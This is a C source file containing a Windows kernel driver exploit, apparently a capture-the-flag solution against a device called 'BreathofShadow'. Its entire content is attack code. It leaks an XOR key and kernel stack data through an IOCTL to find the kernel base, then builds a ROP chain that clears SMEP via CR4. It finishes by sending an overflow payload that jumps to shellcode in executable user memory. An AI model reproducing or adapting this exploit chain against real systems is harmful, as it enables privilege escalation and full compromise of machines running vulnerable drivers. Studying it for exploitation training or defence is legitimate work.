#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"
#define ADDR(x) ((x) ^ KEY)

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

int main(){

    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device\n");

    uintptr_t inputbuf1 = 0x8181818181818181;
    size_t KEY = 0x0;
    char outputbuf1[0x8] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result1 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        &inputbuf1,
        0x8,
        outputbuf1,
        0x8,
        &bytesReturned,
        NULL
    );

    if (result1) {
        printf("[*] IOCTL command sent successfully\n");
        printf("[!] LeakData: 0x%llx\n",inputbuf1);
        KEY = 0x8181818181818181 ^ inputbuf1;
        printf("[!] LeakKey: 0x%llx\n",KEY);

    } else {
        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
    }

    char stack_value[600] = {0x81,0x81,0x81,0x81,0x81,0x81,0x81,0x81};
    char outputbuf2[600] = { 0 };

    BOOL result2 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        stack_value,
        0x8,
        outputbuf2,
        600,
        &bytesReturned,
        NULL
    );

    uintptr_t* STACK_VAL = (uintptr_t*)stack_value;
    uintptr_t leak_kernel = STACK_VAL[33]; // Stack start + 0x108
    uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
    printf("[!] Leak Kernel: 0x%llx\n", leak_kernel);
    printf("[!] Kernel Base: 0x%llx\n", kernel_base);

    uintptr_t payload[75];


    for(int i=0; i < 37; i++){
        payload[i] = ADDR(STACK_VAL[i]);
    }

    payload[37] = ADDR(kernel_base + 0x7a7baf); //0x1407a7baf: pop rcx ; ret ;
    payload[38] = ADDR(0x50ef0);
    payload[39] = ADDR(kernel_base + 0x47f027); // 0x14047f027: mov cr4, rcx ; ret ;

    char shellcode[] = "\x48\xC7\xC0\x34\x12\x00\x00\x48\xC7\xC7\x68\x15\x00\x00\x48\x31\xF8";

    uintptr_t shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode_ptr, shellcode, sizeof(shellcode));

    payload[40] = ADDR(shellcode_ptr);

    BOOL result3 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        payload,
        sizeof(payload),
        NULL,
        sizeof(payload),
        &bytesReturned,
        NULL
    );

    return 0;
}

